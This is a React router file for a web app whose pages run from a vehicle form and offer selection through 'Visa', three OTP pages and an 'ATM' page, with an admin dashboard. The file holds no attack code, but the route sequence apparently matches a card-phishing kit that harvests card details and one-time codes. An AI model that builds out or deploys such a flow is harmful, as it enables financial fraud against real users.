import { Switch, Route, Router as WouterRouter } from "wouter";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";

import Home from "@/pages/Home";
import VehicleForm from "@/pages/VehicleForm";
import SelectOffer from "@/pages/SelectOffer";
import Total from "@/pages/Total";
import Total2 from "@/pages/Total2";
import Visa from "@/pages/Visa";
import Otp from "@/pages/Otp";
import Otp2 from "@/pages/Otp2";
import Otp3 from "@/pages/Otp3";
import Atm from "@/pages/Atm";
import AdminLogin from "@/pages/AdminLogin";
import AdminDashboard from "@/pages/AdminDashboard";
import NotFound from "@/pages/not-found";

const queryClient = new QueryClient();

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/form" component={VehicleForm} />
      <Route path="/select" component={SelectOffer} />
      <Route path="/total" component={Total} />
      <Route path="/total2" component={Total2} />
      <Route path="/visa" component={Visa} />
      <Route path="/otp" component={Otp} />
      <Route path="/otp2" component={Otp2} />
      <Route path="/otp3" component={Otp3} />
      <Route path="/atm" component={Atm} />
      <Route path="/admin" component={AdminLogin} />
      <Route path="/admin/dashboard" component={AdminDashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, "")}>
          <Router />
        </WouterRouter>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
